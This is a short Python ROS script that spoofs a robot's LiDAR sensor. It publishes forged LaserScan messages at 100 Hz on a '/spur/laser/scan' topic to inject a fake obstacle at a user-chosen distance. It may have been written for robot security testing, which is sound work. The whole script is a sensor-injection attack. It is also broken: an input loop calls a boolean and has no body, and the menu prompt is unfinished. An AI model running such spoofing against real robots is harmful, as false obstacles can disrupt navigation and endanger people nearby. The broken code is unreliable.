#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import LaserScan

laser = LaserScan()

scan_pub = rospy.Publisher('/spur/laser/scan', LaserScan, queue_size = 10)
rospy.init_node('lidar_front_spoofing')
rate = rospy.Rate(100)

input_distance = input("Please enter the distance for an arbitrary obstacle the LiDAR has to be spoofed with: ")
input_distance = float(input_distance)

input_correct = False 
while not input_correct():

selection = input("Please select which range version should be applied \n[1] for \n[2] for: \n")
selection = int(selection)

thistuple = ()
v_1 = list(thistuple)
v_2 = list(thistuple)
max_distance = 10
distance = (max_distance - input_distance)/128
d = max_distance

for x in range(128):
    v_1.append(float("inf"))

for x in range(127):
    v_1.append(d)
    d = d - distance

for x in range(2):
    v_1.append(input_distance)

d = input_distance
for x in range(127):
    d = d + distance
    v_1.append(d)

for x in range(640):
    v_1.append(float("inf"))


for x in range(640):
    v_2.append(input_distance)

for x in range(256):
    v_2.append(float("inf"))

for x in range(128):
    v_2.append(input_distance)

if selection == 1:
    thistuple = tuple(v_1)
elif selection == 2: 
    thistuple = tuple(v_2)
elif (selection != 1): # and (selection != 2): 
    print("Selection not valid. ")

laser.ranges = thistuple
laser.angle_min = -3.1415929794311523
laser.angle_max = 3.1415929794311523
laser.angle_increment = 0.00614901
laser.time_increment = 0.0
laser.scan_time = 0.0
laser.range_min = 0.1
laser.range_max = 30

try:
    print("Spoofing the LiDAR Sensor with an arbitrary obstacle is active. ")
    while not rospy.is_shutdown():
        scan_pub.publish(laser)
        rate.sleep()
except KeyboardInterrupt:
    pass
    print("\nSpoofing the LiDAR Sensor with an arbitrary obstacle has stopped.")